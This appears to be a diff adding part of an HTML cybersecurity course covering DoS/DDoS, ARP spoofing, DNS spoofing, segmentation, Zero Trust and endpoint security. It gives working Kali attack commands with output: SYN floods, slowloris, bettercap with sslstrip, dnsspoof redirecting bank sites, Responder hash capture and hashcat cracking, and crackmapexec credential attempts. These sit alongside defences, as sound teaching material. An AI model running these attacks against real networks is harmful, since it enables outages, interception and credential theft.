+      <p>Understanding attacks is prerequisite to defending against them. Ethical hackers use the same tools as attackers but with authorisation. Unauthorised use of these tools is illegal under the Computer Misuse Act (UK), CFAA (US), and equivalent laws globally. Always get written permission first.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T97 ===== -->
+<div class="sec" id="t97">
+  <div class="sh"><span class="sn">Topic 97</span><h2>DoS &amp; DDoS Attacks</h2><span class="se">💥</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Definitions</h3>
+      <div class="cmp">
+        <div class="cp2 o"><h4>💢 DoS (Denial of Service)</h4><ul>
+          <li>Single attacker floods a target</li>
+          <li>Exhausts: bandwidth, CPU, memory, or connection table</li>
+          <li>Easier to block — single source IP</li>
+          <li>Tools: hping3, nping, slowloris</li>
+          <li>Impact: target service unavailable</li>
+        </ul></div>
+        <div class="cp2 r"><h4>🌐 DDoS (Distributed DoS)</h4><ul>
+          <li>Thousands/millions of sources simultaneously</li>
+          <li>Traffic from botnet, amplification, or rented</li>
+          <li>Very hard to block — traffic looks legitimate</li>
+          <li>Volume: 1Tbps+ attacks recorded (Akamai/Cloudflare)</li>
+          <li>Requires CDN, scrubbing, or ISP-level mitigation</li>
+        </ul></div>
+      </div>
+    </div>
+    <div class="sub"><h3>DDoS Types &amp; Amplification</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Type</th><th>Method</th><th>Amplification Factor</th><th>Example</th></tr></thead>
+        <tbody>
+          <tr><td>SYN Flood</td><td>Millions of spoofed SYN packets exhaust server half-open connections</td><td>1x (no amplification)</td><td>Classic L4 attack</td></tr>
+          <tr><td>UDP Flood</td><td>Flood random ports with UDP packets — server responds with ICMP unreachable</td><td>1x</td><td>Consumes bandwidth</td></tr>
+          <tr><td>DNS Amplification</td><td>Query ANY record via spoofed source IP → large DNS response sent to victim</td><td>28–54x</td><td>Spamhaus attack 2013: 300Gbps</td></tr>
+          <tr><td>NTP Amplification</td><td>monlist command returns last 600 clients — spoofed source gets huge response</td><td>556x (!)</td><td>2014: 400Gbps attacks</td></tr>
+          <tr><td>SSDP Amplification</td><td>UPnP devices reflect amplified responses</td><td>30x</td><td>IoT devices as reflectors</td></tr>
+          <tr><td>Slowloris</td><td>Opens many partial HTTP connections — exhausts web server thread pool</td><td>1x (resource exhaustion)</td><td>Apache killer</td></tr>
+          <tr><td>HTTP Flood (L7)</td><td>Legitimate-looking HTTP GET/POST requests — CDN bypass attempts</td><td>1x (but hard to filter)</td><td>Cloudflare: 71M RPS attack 2023</td></tr>
+          <tr><td>Memcached</td><td>Spoof source, query Memcached server — massive response to victim</td><td>51,200x (!)</td><td>GitHub 2018: 1.35Tbps</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="sub"><h3>DoS Testing with Kali (Lab Only)</h3>
+      <div class="terminal">
+        <div class="term-header"><div class="term-dots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="term-title">DoS TESTING — KALI (LAB USE ONLY — NEVER ON REAL TARGETS)</div></div>
+        <div class="term-body"><pre><span class="comment"># ⚠️ ONLY use on systems you OWN or have written permission to test!</span>
+
+<span class="comment"># ── hping3 — SYN flood simulation ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo hping3 <span class="flag">--flood --syn -p 80</span> <span class="ip">192.168.1.100</span></span>
+<span class="comment"># --flood: send packets as fast as possible</span>
+<span class="comment"># --syn: SYN flag set</span>
+<span class="comment"># --rand-source: randomise source IPs (simulates DDoS)</span>
+
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo hping3 <span class="flag">--flood -S --rand-source -p 80</span> <span class="ip">192.168.1.100</span></span>
+
+<span class="comment"># ── Slowloris — HTTP resource exhaustion ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">slowloris <span class="ip">192.168.1.100</span> <span class="flag">-p 80 -s 500</span></span>
+
+<span class="comment"># ── Monitor from defender perspective ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo netstat <span class="flag">-an</span> | grep SYN_RECV | wc -l</span>
+<span class="out">14523   ← Under SYN flood: thousands of half-open connections</span>
+
+<span class="comment"># ── SYN cookies defence (kernel protection) ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo sysctl net.ipv4.tcp_syncookies=1</span>  <span class="comment"># Enable SYN cookies</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo sysctl net.ipv4.tcp_max_syn_backlog=2048</span>  <span class="comment"># Increase backlog</span>
+
+<span class="comment"># ── Rate limiting with iptables (anti-DDoS) ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo iptables -A INPUT -p tcp --dport 80 -m limit --limit 100/sec --limit-burst 200 -j ACCEPT</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo iptables -A INPUT -p tcp --dport 80 -j DROP</span>   <span class="comment"># Drop excess</span></pre></div>
+      </div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Calculate the amplification from a Memcached DDoS: an attacker sends 1Mbps of queries. What bandwidth hits the victim? Why is this devastating?</li>
+      <li>Explain why Cloudflare's 71 million requests/second HTTP flood attack in 2023 was harder to mitigate than a volumetric flood attack.</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>DDoS is an arms race. Attackers use botnets and amplification to generate terabit-scale traffic. Defenders use CDNs (Cloudflare, Akamai), scrubbing centres, anycast routing, and rate limiting. For most organisations, the answer is a cloud-based DDoS mitigation service — no on-premises hardware can absorb a 1Tbps attack.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T98-99 ===== -->
+<div class="sec" id="t98">
+  <div class="sh"><span class="sn">Topics 98–99</span><h2>MitM &amp; ARP Spoofing</h2><span class="se">🎭</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Man-in-the-Middle Attack</h3>
+      <div class="def"><div class="dl">Definition</div>
+        A <strong>Man-in-the-Middle (MitM)</strong> attack is when an attacker secretly intercepts and potentially modifies communication between two parties who believe they are communicating directly. The attacker sees ALL traffic between victim and server — including credentials, session cookies, and sensitive data.
+      </div>
+    </div>
+    <div class="sub"><h3>ARP Spoofing + MitM — Full Attack</h3>
+      <div class="terminal">
+        <div class="term-header"><div class="term-dots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="term-title">ARP SPOOFING + MITM — KALI (LAB ONLY)</div></div>
+        <div class="term-body"><pre><span class="comment"># Network layout:
+# Victim: 192.168.1.50   | Router/Gateway: 192.168.1.1
+# Attacker (us): 192.168.1.10</span>
+
+<span class="comment"># ── Enable IP forwarding (forward traffic between victim and router) ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward</span>
+
+<span class="comment"># ── Method 1: arpspoof (dsniff) ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo arpspoof <span class="flag">-i eth0 -t</span> <span class="ip">192.168.1.50</span> <span class="ip">192.168.1.1</span> &amp;</span>
+<span class="comment"># → Poison victim: tells victim "router (192.168.1.1) is MY MAC"</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo arpspoof <span class="flag">-i eth0 -t</span> <span class="ip">192.168.1.1</span> <span class="ip">192.168.1.50</span> &amp;</span>
+<span class="comment"># → Poison router: tells router "victim (192.168.1.50) is MY MAC"</span>
+
+<span class="comment"># ── Method 2: ettercap (all-in-one MitM tool) ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo ettercap <span class="flag">-T -q -i eth0 -M arp:remote</span> /<span class="ip">192.168.1.50</span>// /<span class="ip">192.168.1.1</span>//</span>
+<span class="out">Ettercap 0.8.3 copyright 2001-2019 Ettercap Development Team
+Randomizing 255 hosts for scanning...
+Scanning the whole netmask for 255 hosts...
+ARP poisoning victims:
+ GROUP 1 : 192.168.1.50
+ GROUP 2 : 192.168.1.1
+Starting Unified sniffing...
+DHCP: [192.168.1.50] REQUEST 192.168.1.50
+HTTP : 192.168.1.50:49155 -> 192.168.1.100:80
+ USER: admin  PASS: <span class="err">password123</span></out>
+
+<span class="comment"># ── Method 3: bettercap (modern, feature-rich) ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo bettercap</span>
+<span class="out">bettercap v2.32.0 &gt;</span> <span class="cmd">net.probe on</span>               <span class="comment"># Discover hosts</span>
+<span class="out">bettercap v2.32.0 &gt;</span> <span class="cmd">set arp.spoof.targets <span class="ip">192.168.1.50</span></span>
+<span class="out">bettercap v2.32.0 &gt;</span> <span class="cmd">arp.spoof on</span>               <span class="comment"># Start ARP poisoning</span>
+<span class="out">bettercap v2.32.0 &gt;</span> <span class="cmd">net.sniff on</span>               <span class="comment"># Capture credentials</span>
+<span class="out">bettercap v2.32.0 &gt;</span> <span class="cmd">set http.proxy.sslstrip true</span>  <span class="comment"># Strip HTTPS to HTTP</span>
+<span class="out">bettercap v2.32.0 &gt;</span> <span class="cmd">http.proxy on</span>              <span class="comment"># Intercept HTTP</span>
+
+<span class="comment"># ── Defences against ARP Spoofing ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo arp -s <span class="ip">192.168.1.1</span> aa:bb:cc:dd:ee:ff</span>  <span class="comment"># Static ARP entry for gateway</span>
+<span class="comment"># On switches: Dynamic ARP Inspection (DAI) — enterprise defence</span></pre></div>
+      </div>
+    </div>
+    <div class="sub"><h3>MitM Defence Summary</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Defence</th><th>Protects Against</th><th>Implementation</th></tr></thead>
+        <tbody>
+          <tr><td>HTTPS / TLS 1.3</td><td>Traffic interception (contents encrypted)</td><td>Enforce HTTPS everywhere, HSTS</td></tr>
+          <tr><td>Dynamic ARP Inspection (DAI)</td><td>ARP poisoning at switch level</td><td>Switch config: <code>ip arp inspection vlan X</code></td></tr>
+          <tr><td>802.1X NAC</td><td>Rogue devices joining network</td><td>RADIUS server, per-device authentication</td></tr>
+          <tr><td>VPN</td><td>MitM on untrusted networks (public WiFi)</td><td>WireGuard/OpenVPN — encrypts all traffic</td></tr>
+          <tr><td>DNSSEC + DoH</td><td>DNS poisoning component of MitM</td><td>Enable DNSSEC validation, use DoH resolver</td></tr>
+          <tr><td>Certificate Pinning</td><td>Rogue CA MitM in TLS</td><td>Mobile apps pin expected cert fingerprint</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Set up a lab with two VMs. Use arpspoof to perform ARP poisoning between them. Use Wireshark to confirm you can see traffic. Then enable HTTPS and verify that the content is unreadable.</li>
+      <li>Why does connecting to public WiFi at a coffee shop with HTTPS provide reasonable protection, but connecting without HTTPS is dangerous?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>ARP spoofing is trivially easy on any unprotected LAN. The complete mitigation is HTTPS (payload encrypted even if intercepted) + DAI on managed switches + VPN on untrusted networks. Bettercap is the go-to MitM framework for modern security testing.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T100 ===== -->
+<div class="sec" id="t100">
+  <div class="sh"><span class="sn">Topic 100</span><h2>DNS Spoofing</h2><span class="se">🌀</span></div>
+  <div class="sb">
+    <div class="sub"><h3>DNS Spoofing Attack</h3>
+      <div class="terminal">
+        <div class="term-header"><div class="term-dots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="term-title">DNS SPOOFING — KALI</div></div>
+        <div class="term-body"><pre><span class="comment"># DNS spoofing: intercept DNS queries, return fake IP addresses
+# Prerequisite: already performing ARP spoofing (MitM position)</span>
+
+<span class="comment"># ── Method 1: dnsspoof ──</span>
+<span class="comment"># Create hosts file with fake entries:</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">cat /tmp/fakehosts.txt</span>
+<span class="out">192.168.1.10  www.bank.com
+192.168.1.10  paypal.com
+192.168.1.10  facebook.com</span>
+
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo dnsspoof <span class="flag">-i eth0 -f</span> /tmp/fakehosts.txt</span>
+<span class="comment"># Victim queries bank.com → we intercept → return 192.168.1.10 (our fake site)</span>
+
+<span class="comment"># ── Method 2: Responder (Windows network poisoning) ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo responder <span class="flag">-I eth0 -wrdv</span></span>
+<span class="out">[+] Listening for events...
+[HTTP] NTLMv2 Client   : 192.168.1.50
+[HTTP] Username        : CORP\alice
+[HTTP] NTLMv2-SSP Hash : alice::CORP:1122334455667788:A4F2...  ← Hash for cracking!</span>
+
+<span class="comment"># ── Crack captured NTLMv2 hash ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">hashcat <span class="flag">-m 5600</span> ntlm_hashes.txt /usr/share/wordlists/rockyou.txt</span>
+<span class="out">alice::CORP:...:Password123  (cracked!)</span>
+
+<span class="comment"># ── Method 3: Fake phishing site with Apache ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo service apache2 start</span>
+<span class="comment"># Clone the legitimate site into /var/www/html</span>
+<span class="comment"># Set Social Engineering Toolkit (SET) credential harvester</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo setoolkit</span>   <span class="comment"># Social Engineering Toolkit</span>
+
+<span class="comment"># ── Defence: Check your actual DNS resolution ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">dig bank.com @1.1.1.1</span>     <span class="comment"># Query Cloudflare DNS directly</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">dig bank.com @8.8.8.8</span>     <span class="comment"># Query Google DNS directly</span>
+<span class="comment"># If results differ from your local DNS → poisoning suspected!</span></pre></div>
+      </div>
+    </div>
+    <div class="sub"><h3>DNS Security Tools</h3>
+      <div class="terminal">
+        <div class="term-header"><div class="term-dots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="term-title">DNS RECONNAISSANCE + ENUMERATION</div></div>
+        <div class="term-body"><pre><span class="comment"># ── DNS enumeration ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">dnsrecon <span class="flag">-d</span> example.com <span class="flag">-t std</span></span>    <span class="comment"># Standard DNS recon</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">dnsrecon <span class="flag">-d</span> example.com <span class="flag">-t brute -D</span> /usr/share/wordlists/dnsmap.txt</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">dnsenum example.com</span>                <span class="comment"># Enumerate DNS + zone transfer attempt</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">fierce <span class="flag">--domain</span> example.com</span>      <span class="comment"># Subdomain brute force</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">dig example.com ANY</span>               <span class="comment"># All DNS records</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">dig axfr @ns1.example.com example.com</span>  <span class="comment"># Zone transfer (if misconfigured)</span>
+<span class="out">; Transfer failed.   ← Good - zone transfer blocked</span></pre></div>
+      </div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Use <code>dnsrecon -d [your_target_domain] -t std</code> (on your own domain). What records are exposed? Could any help an attacker?</li>
+      <li>What is a DNS zone transfer (<code>AXFR</code>) and why should it be disabled on public-facing DNS servers?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>DNS spoofing transforms every network interaction into a potential phishing attack. Responder is particularly powerful in Windows corporate environments — it poisons NetBIOS/LLMNR and captures NTLMv2 hashes from every Windows machine that fails to resolve a hostname. Enable DNSSEC, use DoH, and disable LLMNR/NetBIOS on corporate networks.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T101 ===== -->
+<div class="sgt">🔥 Advanced Security Architecture</div>
+<div class="sec" id="t101">
+  <div class="sh"><span class="sn">Topic 101 🔥</span><h2>Network Segmentation</h2><span class="se">🏗️</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Definition &amp; Architecture</h3>
+      <div class="def"><div class="dl">Definition</div>
+        <strong>Network segmentation</strong> divides a network into isolated zones (segments/VLANs) so that traffic between zones must pass through security controls (firewalls, ACLs). It limits lateral movement — a compromised device in one segment cannot directly reach devices in another.
+      </div>
+    </div>
+    <div class="sub"><h3>Enterprise Segmentation Model</h3>
+      <div class="cb"><div class="clbl">NETWORK SEGMENTATION DESIGN</div><pre><span class="ci">                     INTERNET
+                          │
+             ┌────────────┴──────────────┐
+             │    PERIMETER FIREWALL      │  Block all inbound except 80, 443
+             │    + DDoS Protection CDN   │
+             └────────────┬──────────────┘
+                          │
+             ┌────────────┴──────────────┐
+             │           DMZ             │  192.168.100.0/27
+             │   Web: .100.10            │  Internet-facing services
+             │   Mail: .100.11           │
+             │   VPN GW: .100.12         │
+             └────────────┬──────────────┘
+                          │
+             ┌────────────┴──────────────┐
+             │    INTERNAL FIREWALL       │  Strict DMZ → Internal rules
+             └───┬──────┬───────┬────────┘
+                 │      │       │       │
+<span class="cg">         VLAN 10</span>  <span class="cy">VLAN 20</span>  <span class="co">VLAN 30</span>  <span class="cr">VLAN 40</span>   <span class="cp">VLAN 50</span>
+         Corporate Finance  IT Admin  IoT     Guest WiFi
+         10.1.0/23  10.2.0/25 10.3.0/26 10.4.0/24 10.5.0/24
+         Employees  Restrict  Privileged Isolated  Internet only
+
+<span class="cd"># Firewall rules between VLANs:
+# Corporate → Internet: Allow 80, 443, 53 only
+# Finance ← Corporate: DENY (need explicit allow)
+# IT Admin → All VLANs: Allow (admin access)
+# IoT → Internet: DENY (no C2 exfiltration)
+# Guest → Corporate: DENY completely</span></pre></div>
+    </div>
+    <div class="sub"><h3>Kali — VLAN &amp; Segmentation Testing</h3>
+      <div class="terminal">
+        <div class="term-header"><div class="term-dots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="term-title">VLAN HOPPING + SEGMENTATION TESTING</div></div>
+        <div class="term-body"><pre><span class="comment"># ── Test network segmentation (from corporate VLAN) ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">ping <span class="ip">10.2.0.1</span></span>     <span class="comment"># Can I reach Finance VLAN? (should fail)</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nmap <span class="flag">-sn</span> <span class="ip">10.2.0.0/25</span></span>  <span class="comment"># Discover Finance VLAN hosts (should fail)</span>
+<span class="out">Note: Host seems down. If it is really up, but blocking our pings...
+Nmap done: 126 IP addresses (0 hosts up) scanned  ← Good! Segmented.</span>
+
+<span class="comment"># ── VLAN hopping attack (yersinia) ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo yersinia <span class="flag">-I</span></span>   <span class="comment"># Interactive mode, attack L2 protocols</span>
+<span class="comment"># Select DTP (Dynamic Trunking Protocol) attack to become a trunk port</span>
+
+<span class="comment"># ── Creating VLAN subinterface (test access) ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo modprobe 8021q</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo vconfig add eth0 20</span>         <span class="comment"># Create VLAN 20 interface</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo ip addr add <span class="ip">10.2.0.50/25</span> dev eth0.20</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo ip link set eth0.20 up</span>
+
+<span class="comment"># ── crackmapexec — lateral movement testing ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">crackmapexec smb <span class="ip">10.1.0.0/23</span></span>     <span class="comment"># Enumerate SMB in corporate VLAN</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">crackmapexec smb <span class="ip">10.1.0.0/23</span> <span class="flag">-u</span> admin <span class="flag">-p</span> password123</span>  <span class="comment"># Try credentials</span></pre></div>
+      </div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Design network segmentation for a hospital: staff PCs, nurse stations, IoT medical devices, patient WiFi, administration, and servers with patient records. How many VLANs? What firewall rules between them?</li>
+      <li>How does VLAN hopping work, and what two switch configuration changes prevent it?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Network segmentation is the most impactful defensive control for limiting attack blast radius. WannaCry and NotPetya spread catastrophically because of flat, unsegmented networks. A properly segmented network can contain a ransomware outbreak to a single VLAN — protecting the other 95% of the organisation.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T102 ===== -->
+<div class="sec" id="t102">
+  <div class="sh"><span class="sn">Topic 102 🔥</span><h2>Zero Trust Security</h2><span class="se">🔄</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Zero Trust Principles</h3>
+      <div class="def"><div class="dl">Zero Trust Philosophy</div>
+        <strong>"Never Trust, Always Verify"</strong> — Zero Trust abandons the traditional perimeter model (trust everything inside the network). Instead: verify every access request regardless of network location, enforce least privilege, assume breach at all times. Popularised by Google's BeyondCorp (2009) and mandated by US Executive Order 14028 (2021).
+      </div>
+    </div>
+    <div class="sub"><h3>Zero Trust vs Perimeter Security</h3>
+      <div class="cmp">
+        <div class="cp2 o"><h4>🏰 Traditional Perimeter (Castle &amp; Moat)</h4><ul>
+          <li>"Trust but verify" inside the network</li>
+          <li>VPN = drawbridge → once in, full access</li>
+          <li>Flat internal network — lateral movement easy</li>
+          <li>Implicit trust for internal IP addresses</li>
+          <li>Single breach = full internal access</li>
+          <li>Fails against insider threats and supply chain</li>
+        </ul></div>
+        <div class="cp2 g"><h4>🔄 Zero Trust (BeyondCorp Model)</h4><ul>
+          <li>"Never trust, always verify" everywhere</li>
+          <li>Identity-centric — user + device + context = access</li>
+          <li>Micro-segmentation — every service has its own perimeter</li>
+          <li>MFA required for every resource access</li>
+          <li>Continuous verification — session re-verified periodically</li>
+          <li>Limits blast radius if credential is compromised</li>
+        </ul></div>
+      </div>
+    </div>
+    <div class="sub"><h3>Zero Trust Architecture Components</h3>
+      <div class="flow">
+        <div class="fn s">User + Device requests access to resource</div>
+        <div class="fa"><div class="ln"></div><div class="tip"></div></div>
+        <div class="fn">Identity Verification: MFA + SSO (Okta, Azure AD, Duo)</div>
+        <div class="fa"><div class="ln"></div><div class="tip"></div></div>
+        <div class="fn">Device Compliance Check: Is device patched? EDR installed? Certificate valid?</div>
+        <div class="fa"><div class="ln"></div><div class="tip"></div></div>
+        <div class="fn">Context Analysis: Unusual location? Time? Risk score? Behavioural baseline?</div>
+        <div class="fa"><div class="ln"></div><div class="tip"></div></div>
+        <div class="fn">Policy Decision Point: Allow, Deny, or Step-up auth?</div>
+        <div class="fa"><div class="ln"></div><div class="tip"></div></div>
+        <div class="fn w">Access granted to SPECIFIC resource only (not full network)</div>
+        <div class="fa"><div class="ln"></div><div class="tip"></div></div>
+        <div class="fn">Continuous monitoring: Re-verify periodically, log all actions</div>
+      </div>
+    </div>
+    <div class="sub"><h3>Zero Trust Implementation</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Pillar</th><th>What to Implement</th><th>Tools</th></tr></thead>
+        <tbody>
+          <tr><td>Identity</td><td>MFA everywhere, SSO, privileged access mgmt</td><td>Azure AD, Okta, Duo, CyberArk</td></tr>
+          <tr><td>Device</td><td>Device compliance before access; EDR; cert-based auth</td><td>Intune, Jamf, CrowdStrike</td></tr>
+          <tr><td>Network</td><td>Micro-segmentation; ZTNA instead of VPN; east-west inspection</td><td>Zscaler, Cloudflare Access, Illumio</td></tr>
+          <tr><td>Application</td><td>Per-app access control; WAF; API security</td><td>Cloudflare Access, BeyondCorp</td></tr>
+          <tr><td>Data</td><td>Classify and label all data; encrypt at rest and transit</td><td>Microsoft Purview, Varonis</td></tr>
+          <tr><td>Visibility</td><td>Log everything; UEBA (anomaly detection); SIEM</td><td>Splunk, Microsoft Sentinel</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Compare traditional VPN access with ZTNA (Zero Trust Network Access). Why does ZTNA provide less lateral movement risk?</li>
+      <li>You are implementing Zero Trust for a 200-person company. List the first 5 controls you would implement in priority order, justifying each choice.</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Zero Trust is not a product — it's an architecture and a philosophy. It acknowledges the reality that perimeters are porous, credentials get stolen, and trusted devices get compromised. The SolarWinds attack is the perfect argument for Zero Trust: legitimate software, legitimate credentials, legitimate network access — all exploited because implicit trust existed.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T103 ===== -->
+<div class="sec" id="t103">
+  <div class="sh"><span class="sn">Topic 103 🔥</span><h2>Endpoint Security (EDR)</h2><span class="se">💻</span></div>
+  <div class="sb">
+    <div class="sub"><h3>AV vs EDR vs XDR</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Generation</th><th>Technology</th><th>Detection Method</th><th>Response</th><th>Example Products</th></tr></thead>
+        <tbody>
+          <tr><td>Traditional AV</td><td>Signature scanning</td><td>Hash/signature match against malware DB</td><td>Quarantine file</td><td>McAfee VirusScan, Norton, AVG</td></tr>
+          <tr><td>Next-Gen AV</td><td>AI/ML + signatures</td><td>Machine learning on file characteristics</td><td>Block + quarantine</td><td>Windows Defender, Malwarebytes, Cylance</td></tr>
+          <tr><td>EDR</td><td>Behavioural monitoring</td><td>Track all process behaviour, memory, network, registry in real-time</td><td>Isolate endpoint, kill process, rollback</td><td>CrowdStrike Falcon, SentinelOne, Carbon Black</td></tr>
+          <tr><td>XDR</td><td>Cross-layer correlation</td><td>Correlates endpoint + network + cloud + email signals</td><td>Automated playbooks across all layers</td><td>Palo Alto Cortex XDR, Microsoft Defender XDR</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="sub"><h3>Linux Endpoint Security — Kali</h3>
+      <div class="terminal">
+        <div class="term-header"><div class="term-dots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="term-title">ENDPOINT SECURITY TOOLS — KALI/LINUX</div></div>
+        <div class="term-body"><pre><span class="comment"># ── ClamAV — open source antivirus ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo apt install clamav clamav-daemon -y</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo freshclam</span>                     <span class="comment"># Update virus definitions</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo clamscan <span class="flag">-r /home --infected</span></span>   <span class="comment"># Recursive scan, show only infected</span>
+<span class="out">----------- SCAN SUMMARY -----------
+Known viruses: 8,553,423
+Infected files: 2     ← Found malware!</span>
+
+<span class="comment"># ── Lynis — security auditing tool ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo apt install lynis</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo lynis audit system</span>
+<span class="out">[ Hardening index: 65 ]
+Suggestions (24):
+  - Consider hardening SSH configuration [SSH-7408]
+  - Configure minimum password age in /etc/login.defs [AUTH-9286]
+  - Install a PAM module for brute force protection [AUTH-9262]</span>
+
+<span class="comment"># ── Rootkit detection ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo apt install chkrootkit rkhunter</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo chkrootkit</span>              <span class="comment"># Check for known rootkits</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo rkhunter <span class="flag">--check</span></span>       <span class="comment"># Rootkit hunter</span>
+
+<span class="comment"># ── Process monitoring for suspicious activity ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">ps auxf</span>                     <span class="comment"># All processes in tree format</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">ls -la /proc/$(pgrep suspicious_process)/exe</span>  <span class="comment"># Find process binary</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">lsof -i</span>                     <span class="comment"># All open network connections by process</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">lsof -p [PID]</span>               <span class="comment"># All files opened by specific process</span>
+
+<span class="comment"># ── auditd — Linux audit framework ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo systemctl start auditd</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo auditctl -w /etc/passwd -p rwa -k passwd_access</span>  <span class="comment"># Alert on passwd changes</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo ausearch <span class="flag">-k passwd_access</span></span>   <span class="comment"># Search audit log</span>
+
+<span class="comment"># ── OSSEC/Wazuh — host-based IDS ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
